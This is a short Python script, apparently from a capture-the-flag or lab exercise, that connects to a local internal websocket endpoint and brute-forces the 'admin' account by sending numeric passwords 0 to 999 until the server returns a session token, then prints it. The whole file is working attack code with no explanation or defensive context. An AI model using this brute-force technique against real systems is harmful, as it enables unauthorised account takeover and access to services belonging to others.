import websocket

ws = websocket.create_connection("ws://localhost:5000/internal/ws")
ws.recv()
ws.send("begin")
for i in range(0, 1000):
    ws.send("user admin")
    ws.send("pass " + str(i))
    d = ws.recv()
    if d == "error":
        print("error")
        break
    elif d.startswith("session"):
        print(i)
        print(d)
        break
